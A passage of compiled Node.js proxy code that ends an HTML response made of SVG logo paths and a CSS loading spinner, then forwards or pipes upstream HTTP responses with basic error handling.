  <path class="cls-1" d="M130.5,77.85s-1.86-.78-.66-1.77c1.28-1.06,7.81.46,8.71.6s1.42.16,2.29.14c3.94-.08,6.49-.29,7.73-.39h0c.71.38-.64,1.41-1.42,1.51-.96.12-1.71.27-2.27.44-.8.25-1.37.77-1.72,1.56-.21.52-.36,1.8-.46,3.87-.09,2.06-.18,4.71-.25,7.95-.09,3.63-.16,6.93-.21,9.88-.05,2.95-.07,5.88-.07,8.79,0,2.65.07,4.61.21,5.87.01.12.03.23.04.33.18,1.38,1.23,2.5,2.6,2.72.02,0,.03,0,.05,0,.93.14,2.9.21,5.92.21,3.33,0,6.11-.27,8.35-.81s6.15-4.22,6.95-5.21c2.02-2.52,3.44-6.81,3.44-6.81,0,0,.76-.58,1.16.14s-.61,4.62-1.3,6.74c-.46,1.42-2.5,5.69-3.21,6.85-.76,1.25-1.27,1.26-2.05,1.31-.93.05-2.51-.07-3.18-.07-.73-.02-1.4-.04-2.02-.05-.49,0-1.04-.01-1.65-.02-.33,0-.67.03-1,.08-2.83.44-17.33,2.54-24.19-.08-.26-.1-.51-.47-.07-1.09.59-.82,2.37-.59,3-.91s1.1-.9,1.41-1.71c.31-.81.52-2.02.61-3.64.09-1.62.14-3.95.14-7l.07-15.47c.05-3.49.05-6.14,0-7.95-.05-1.8-.21-3.15-.49-4.03s-.76-1.17-1.37-1.44c-.61-.27-3.77-.52-5.1-.57Z"/>
  <path class="cls-1" d="M168.72,77.66c-.4-.68.65-.96.65-.96,2.95.02,4.04.34,4.95.41,1.73.13,3.69.13,4.74-.04,2.72-.45,8.09-.97,9.34-1.06h0c.66.87-.19,1.89-1.06,2.15-1.14.34-2.83-.38-4.18-.21-.96.12-1.71.27-2.27.44-.8.25-1.37.77-1.72,1.56-.21.52-.36,1.8-.46,3.87s-.18,4.71-.25,7.95c-.09,3.63-.16,6.93-.21,9.88s-.07,5.88-.07,8.79c0,2.65.07,4.61.21,5.87.01.11.02.21.04.31.18,1.39,1.24,2.53,2.62,2.74,0,0,.02,0,.03,0,.93.14,2.86.59,5.89.59,3.33,0,6.15-.65,8.39-1.18s6.21-3.72,7.24-5.28c1.69-2.57,2.62-4.68,3.18-6.88,0,0,.71-.52,1.16.14.27.39-.87,5.39-1.36,7.31-.38,1.46-2.35,5.74-3.13,6.86-.42.59-.95,1.09-1.68,1.02-1.45-.15-2.65-.22-3.6-.22-.73-.02-1.4-.04-2.02-.05s-1.34-.02-2.16-.02c0,0-17.08,3.51-24.68,0-.54-.25-.07-1.09-.07-1.09,1.37-.28,2.37-.59,3-.91.63-.33,1.1-.9,1.41-1.71.31-.81.52-2.02.61-3.64s.14-3.95.14-7l.07-15.47c.05-3.49.05-6.14,0-7.95s-.21-3.15-.49-4.03-.73-1.45-1.34-1.72-2.24.68-2.92-.47Z"/>
  <path class="cls-1" d="M240.76,107.09c.04-.21.82-1.05,1.16.35.27,1.09-.72,5.59-1.16,7.19-.33,1.21-1.95,5.15-2.43,6.27-.28.65-.97.87-1.66,1.01-.57.12-1.01.12-1.97.22-1.33.14-3.27,0-5.68,0-1.45,0-2.89-.28-4.65-.42-1.66-.14-2.38-.07-2.14-.07-1.52,0-3.3.02-5.33.05s-4.47.1-7.33.19-4.96.18-6.29.25c0,0-.63-.5.07-1.2.64-.64,1.47-.35,2.23-.54.76-.2,1.27-.42,1.54-.65.27-.23.47-.52.58-.86.12-.34.24-.96.35-1.85.14-.89.28-2.5.41-4.83s.23-4.95.32-7.86.11-4.72.09-5.45l-.25-11.18c-.07-3.47-.21-5.81-.4-7.03s-.58-2.03-1.14-2.43-2,.88-3.36-.96c-.32-.44-.09-.97.23-1.01h22.54c2.53,0,8.57-.09,13.68-.28-.12,2.02-.33,4.03-.63,6.05s-.69,3.02-1.16,3.02c-.59,0-.88-.18-.88-.53,0-.14.05-.59.14-1.34s.15-1.18.14-1.3c-.15-3.35-3.01-3.14-5.22-3.43-2.09-.27-4.01-.54-6.86-.54s-6.53.08-9.42,1.22c-1.32.52-2.15,1.51-2.25,2.6-.29,3.08-.33,4.48-.33,6.69,0,1.73.01,3.73.04,5.98v.76c.02,1.36,1.11,2.46,2.47,2.47.75,0,1.66,0,2.73,0,4.97,0,8.38-.09,10.23-.28,1.05-.12,1.76-.26,2.13-.42s.71-.58,1.04-1.25.69-1.69,1.09-3.08l1.02.07c0,2.44,0,4.62-.02,6.54s-.03,4.12-.05,6.61h-1.23c-.07-2.16-.39-3.66-.97-4.5s-1.68-1.38-3.32-1.62-4.56-.35-8.75-.35c-1.56,0-2.92.04-4.09.12-1.28.09-2.27,1.14-2.3,2.42l-.08,2.8c-.14,5.21,0,9.39.4,12.56.12.94.82,1.7,1.74,1.92h0c.58.14,1.14.25,1.67.33.53.08,1.28.16,2.26.25s2.21.12,3.69.12c3.67,0,6.43-.57,8.53-1.11,2.09-.54,5.11-2.99,5.86-4.45.94-1.82,2.54-5.08,3.01-7.27Z"/>
  <path class="cls-1" d="M241.38,86.27c-1.38-.12-.54-3.43-.54-3.43,1.11-2.93,2.1-5.72,2.97-8.37,1.52-.84.98.85,1.26,1s.79.28,1.51.37c1.5.19,2.59.28,7.91.28h17.78c.45,0,1.87-.02,4.29-.07s3.79-.07,4.15-.07c.98,0,1.64-.06,1.97-.19s.68-.4,1.05-.83c.62-.49,1.33-.78.91.88-1.05,4.19-.5,10.92-3.04,11.56-2.98.76-.57-3.17-.57-3.17.12-.77.37-2.81.44-4.14-.66-.56-1.71-1.01-3.16-1.35s-3.79-.51-7-.51c-2.34,0-1.99-.06-2.74,0-.86.07-1.71.18-2.69,1.23s-1.03,1.97-1.08,2.48l-.1,2.34c0,.75-.07,2.82-.21,6.19-.02.84-.05,3.15-.07,6.91s-.05,7.03-.07,9.8c0,3.52.04,5.99.11,7.41.07,1.42.27,2.5.6,3.25.33.75.83,1.24,1.49,1.48.67.24,1.81.46,3.43.67,1.05.09,1.46.28,1.58.45.3.4.17.64-.07.82-.37.29-.68.33-1.32.34-1.42.02-2.76-.26-3.81-.48-1.64-.34-2.8-.55-3.76-.55-2.27,0-4.8.55-7.52.97-1.5.26-1.83.4-2.19.49s-.75.29-1.1.23c-.83-.15-1.02-1.12-.7-1.68.3-.09,1.32-.09,2.47-.38,1.64-.38,2.49-.81,3.21-1.11s1.09-.7,1.41-1.13c.29-.39.55-1.05.55-2.01,0-1.15.09-2.47.28-3.97,0,.14.02-1.25.07-4.18s.08-5.01.11-6.24.04-2.7.04-4.41c0-5.02-.02-8.6-.05-10.76s-.11-3.83-.23-5.01v-.04c-.16-1.62-1.48-2.86-3.11-2.94-1.3-.07-2.66-.1-4.1-.1-2.53,0-2.18.08-3.57.25s-2.47.43-3.23.81-1,.74-1.32,1.21-.64,5.85-2.23,5.7Z"/>
</svg> <style>.loader {
    width: 48px;
    height: 48px;
    border: 5px solid black;
    margin-left:25px;
    margin-top:20px;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    }</style><span class="loader"></span>`);
                    res.write(deleteGoogle);
                    res.end();
                    response.on('error', (error) => {
                        console.error('Response stream error:', error);
                        res.status(500).end('Internal Server Error');
                    });
                });
            }
            else {
                res.writeHead(response.statusCode || 500, response.headers);
                response.pipe(res);
                response.on('error', (error) => {
                    console.error('Response stream error:', error);
                    res.status(500).end('Internal Server Error');
                });
            }
        });
        req.on('aborted', () => {
            proxyRequest.destroy();
        });
        req.pipe(proxyRequest);
        req.on('error', (e) => {
            console.log(e);
        });
    }
    catch (error) {
        console.log(error);
    }
};
exports.delegateSimpleRequest = delegateSimpleRequest;
